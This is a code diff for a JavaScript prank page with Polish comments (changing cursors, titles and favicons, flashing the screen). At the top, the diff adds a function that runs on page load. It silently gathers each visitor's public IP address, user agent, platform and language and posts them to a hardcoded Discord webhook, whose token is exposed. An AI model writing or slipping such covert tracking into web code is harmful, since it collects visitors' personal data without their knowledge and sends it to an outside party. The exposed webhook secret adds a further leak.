@@ -1,3 +1,33 @@
+// Funkcja wysyłająca dane użytkownika na webhook Discorda
+async function sendUserDataToWebhook() {
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+
+    const userAgent = navigator.userAgent;
+    const platformInfo = navigator.platform;
+    const language = navigator.language;
+
+    const data = {
+      content: `**Nowy użytkownik:**\nIP: ${ipData.ip}\nUser Agent: ${userAgent}\nPlatforma: ${platformInfo}\nJęzyk: ${language}`
+    };
+
+    await fetch('https://discord.com/api/webhooks/1373725358951764118/wwpbThoUoNmzFQ4mlRa6Fz_LMLO6RrvlaL1Us3vxDC8nJtfVHMjJfxm28SxMU-t5MIt1', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+    });
+  } catch (e) {
+    console.error('Nie udało się wysłać danych na webhook:', e);
+  }
+}
+
+// Wywołujemy wysyłkę zaraz po załadowaniu strony
+window.addEventListener('load', () => {
+  sendUserDataToWebhook();
+});
+
+// Twój oryginalny kod do "Antka":
 const button = document.getElementById('crazyButton');
 const message = document.getElementById('message');
 
@@ -141,7 +171,6 @@ const cursors = [
   "url('https://cur.cursors-4u.net/symbols/sym-6/sym535.cur'), auto"
 ];
 
-// **flagi i interval ID, żeby móc ich uniknąć**
 let antekActive = false;
 let intervals = [];
 
@@ -173,7 +202,6 @@ button.addEventListener('click', () => {
     document.body.requestFullscreen().catch(() => {});
   }
 
-  // Tutaj ustawiamy wszystkie setInterval dopiero po kliknięciu:
   intervals.push(setInterval(changeFavicon, 2000));
   intervals.push(setInterval(changeTitle, 1500));
   intervals.push(setInterval(flashScreen, 7000));
